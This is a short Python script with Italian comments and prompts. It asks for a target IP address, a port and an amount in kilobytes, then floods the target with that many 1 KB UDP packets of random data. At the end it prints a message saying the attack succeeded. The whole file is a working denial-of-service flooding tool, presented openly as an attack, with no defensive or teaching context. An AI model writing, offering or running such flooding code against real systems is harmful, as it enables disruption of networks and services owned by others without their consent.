import socket
import random

# Richiesta dell'IP e della porta target

ip_target =  input("inserisci qui l'indirizzo ip del bersaglio target\n")
porta_target = int(input("inserisci qui il numero della porti del bersaglio target\n "))

# Richiesta del numero di kb da inviare

byte_da_inviare =int(input("Inserisci il numero di  kb da inviare\n"))

# Creazione del socket UDP

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Calcolo del numero di pacchetti da inviare (1 pacchetto = 1 KB)

conto_byte = byte_da_inviare

# Generazione dei dati casuali per il pacchetto

pacchetto_dati = random.randbytes(1024)


# Invio dei pacchetti

for _ in range(conto_byte):
	s.sendto(pacchetto_dati, (ip_target, porta_target))


s.close()

print("attacco andato a buon fine")
